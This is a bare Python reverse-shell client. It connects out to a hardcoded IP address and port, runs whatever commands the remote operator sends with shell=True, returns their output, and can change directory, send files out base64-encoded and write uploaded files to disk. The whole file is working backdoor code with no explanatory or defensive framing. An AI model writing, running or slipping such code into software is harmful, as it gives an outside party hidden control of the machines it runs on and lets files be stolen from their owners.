#!/usr/bin/python
import socket
import subprocess
import json
import os
import base64
def reliable_send(data):
	json_data = data
	print(json_data)
	sock.sendall(json_data)

def reliable_recv():
	data=""
	while True:
		try:
			data = data + sock.recv(1024).decode()
			print(data)
			#return json.loads(data)
			return data
		except ValueError as e:
			print("caught")
			print(e)
			return "error" 


def shell():
	while True:
		print("Listening")
		command = reliable_recv()
		print(command)
		if command == 'q':
			continue
		elif command =="exit":
			break
		elif command[:2] == "cd" and len(command) >1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:7] =="sendall":
			subprocess.Popen(command[8:],shell =True)
		elif command[:8] == "download":
			with open(command[9:],"rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] =="upload":
			with open(command[7:],"wb") as fin:
				file_data = reliable_recv()
				fin.write(base64.b64decode(file_data))
		else :
			proc = subprocess.Popen(command,shell = True,stdout = subprocess.PIPE,stderr = subprocess.PIPE,stdin = subprocess.PIPE)
			result = proc.stdout.read() + proc.stderr.read()
			print("sending ls")
			reliable_send(result)


sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(("172.17.229.88",54321))

shell()
sock.close()

